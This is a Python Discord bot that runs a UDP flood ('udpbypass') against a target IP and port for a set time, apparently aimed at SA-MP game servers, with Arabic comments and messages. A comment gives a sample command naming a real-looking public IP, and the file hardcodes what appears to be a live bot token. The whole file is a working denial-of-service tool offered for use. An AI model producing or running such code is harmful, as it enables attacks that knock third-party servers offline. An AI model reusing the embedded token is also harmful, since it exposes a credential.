import discord
from discord.ext import commands
import asyncio
import socket
import time

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

is_running = False

# حزمة استعلام ومحاكاة تجاوز (SAMP UDP Bypass Packet)
def generate_bypass_packet(ip, port):
    ip_parts = [int(p) for p in ip.split('.')]
    # حزمة مخصصة لتوليد ضغط عالي عبر UDP
    packet = b'SAMP' + bytes(ip_parts) + port.to_bytes(2, byteorder='little') + b'i' * 10
    return packet

async def run_attack(ctx, ip, port, duration):
    global is_running
    is_running = True
    target = (ip, port)
    packet = generate_bypass_packet(ip, port)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    
    start_time = time.time()
    count = 0
    
    await ctx.send(f"🚀 **تم بدء الهجوم بنجاح!**\n🎯 الهدف: `{ip}:{port}`\n⏱️ المدة: `{duration} ثانية`\n⚙️ الأسلوب: `udpbypass`")
    
    try:
        while is_running and (time.time() - start_time < duration):
            # إرسال حزم مكثفة غير متزامنة
            for _ in range(200):
                sock.sendto(packet, target)
            count += 200
            await asyncio.sleep(0.001)
    except Exception as e:
        print(f"Error: {e}")
    
    is_running = False
    await ctx.send(f"🛑 **انتهى الهجوم أو تم إيقافه!**\n🎯 الهدف السابق: `{ip}:{port}`")

@bot.event
async def on_ready():
    print(f"✅ تم تسجيل الدخول بنجاح كـ: {bot.user}")

# أمر الهجوم بالمواصفات الجديدة: !attack 190.2.142.89 40040 30 udpbypass
@bot.command()
async def attack(ctx, ip: str, port: int, duration: int, method: str):
    global is_running
    
    if method.lower() != "udpbypass":
        await ctx.send("⚠️ طريقة الهجوم غير صحيحة! استخدم الكلمة: `udpbypass`")
        return
        
    if is_running:
        await ctx.send("⚠️ هناك عملية هجوم تعمل حالياً! انتظر حتى تنتهي أو اكتب `!stop` لإيقافها.")
        return
    
    # تشغيل الهجوم في الخلفية مع تمرير الوقت
    asyncio.create_task(run_attack(ctx, ip, port, duration))

# أمر الإيقاف اليدوي
@bot.command()
async def stop(ctx):
    global is_running
    if not is_running:
        await ctx.send("ℹ️ لا توجد أي عملية هجوم شغالة حالياً.")
        return
    
    is_running = False
    await ctx.send("🛑 **جاري إيقاف الهجوم فوراً...**")

# ضع التوكن الخاص بك هنا
TOKEN = "MTUzNjIxNDc5MDIzMjM1MDg1MA.GfJrrQ.cg80tDubsi_29S5EvWcHhN-rLkNxzTHT78OaSI"

if __name__ == "__main__":
    bot.run(TOKEN)
    